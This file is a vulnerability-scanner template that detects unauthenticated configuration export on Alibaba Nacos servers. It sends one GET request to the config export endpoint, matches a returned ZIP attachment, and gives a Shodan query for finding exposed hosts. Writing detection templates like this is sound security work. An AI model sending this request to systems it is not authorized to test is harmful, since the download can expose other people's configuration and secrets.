id: nacos-info-leak

info:
  name: Nacos - Information Disclosure
  author: s4e-io
  severity: high
  description: |
    Nacos unauthorized download of configuration information.
  reference:
    - https://github.com/wy876/POC/blob/main/Nacos/Nacos%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8B%E8%BD%BD%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF.md
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Nacos"
    product: nacos
    vendor: alibaba
  tags: nacos,tech,config,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId="

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "PK")'
          - 'contains(content_type, "application/octet-stream")'
          - 'regex("attachment;filename=(.*).zip", content_disposition)'
          - 'status_code == 200'
        condition: and

# digest: 4a0a0047304502203117ed86cad62ccb5ab43a55272dba18d2461d7637c0d9288c3ffee01a8aced4022100c696eff61b988ccb7fc09bc0a799c311c091d85849ca73f5b1651385e4ef6b1d:922c64590222798bb761d5b6d8e72950